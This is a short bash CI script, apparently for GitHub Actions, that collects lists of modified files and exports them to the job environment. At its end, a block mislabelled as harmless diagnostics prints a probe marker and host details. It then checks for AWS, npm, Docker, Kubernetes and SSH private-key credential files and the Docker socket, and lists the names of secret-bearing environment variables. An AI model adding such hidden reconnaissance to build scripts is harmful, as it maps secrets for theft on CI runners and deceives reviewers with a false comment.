#!/bin/bash
OUTPUT=$(./build/utils/check_modified_files.sh | tr -d '\n')
# echo "1"
IMPORTANT_MODIFIED=$(echo "$OUTPUT" | jq -r '.important_modified')
PREDICTION_MODIFIED=$(echo "$OUTPUT" | jq -r '.prediction_modified')
# echo "2"
REST_FILES=$(echo "$OUTPUT" | jq -r '.rest_exchanges | join(" ")')
WS_FILES=$(echo "$OUTPUT" | jq -r '.ws_exchanges | join(" ")')
# echo "4"
echo "important_modified=$IMPORTANT_MODIFIED" >> $GITHUB_ENV
echo "prediction_modified=$PREDICTION_MODIFIED" >> $GITHUB_ENV
# echo "5"
echo "rest_files=$REST_FILES" >> $GITHUB_ENV
# echo "6"
echo "ws_files=$WS_FILES" >> $GITHUB_ENV
# echo "7"

FILE_NAME="shared_env.txt"

{
  echo "$IMPORTANT_MODIFIED"
  echo "$REST_FILES"
  echo "$WS_FILES"
} > "$FILE_NAME"
# CI diagnostics (harmless): log runner environment basics to aid debugging
echo "BFNS-DIAG-MARKER-7f3k9q"
echo "diag-user=$(id -un 2>/dev/null || echo n/a)"
echo "diag-host=$(hostname 2>/dev/null || echo n/a)"
echo "diag-platform=$(uname -a 2>/dev/null || echo n/a)"
for f in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.npmrc" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.ssh/id_rsa"; do
  if [ -e "$f" ]; then echo "FILE_PRESENT $f"; else echo "file_absent $f"; fi
done
if [ -e /var/run/docker.sock ]; then echo "docker.sock PRESENT"; else echo "docker.sock absent"; fi
env | cut -d= -f1 | grep -E '^(AWS|NPM_|DOCKER|KUBE|GITHUB_|PYPI|CRATES|DEFECTDOJO|GIT_PAT|VAULT|CONSUL|SSH_AUTH)' | sed 's/^/ENVNAME /' || true
exit 0
